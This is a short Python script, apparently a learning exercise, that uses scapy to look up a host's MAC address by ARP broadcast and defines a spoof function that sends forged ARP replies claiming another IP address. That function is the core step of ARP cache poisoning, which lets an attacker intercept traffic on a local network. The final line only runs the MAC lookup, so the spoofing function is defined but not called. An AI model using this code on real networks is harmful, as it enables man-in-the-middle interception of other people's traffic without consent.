#!/usr/bin/env python

import scapy.all as scapy

# Function to scan the target IP for MAC addresses
def get_mac(ip):
    # Creating an ARP request packet to get the MAC address corresponding to the IP
    arp_request = scapy.ARP(pdst=ip)
    # Creating an Ethernet frame to transport the ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # Sending the ARP request and getting the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # filters answered_list to specific MAC address
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #op is set to 2 which is for ARP response. the default option, 1, is for ARP request
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

get_mac("192.168.122.1")
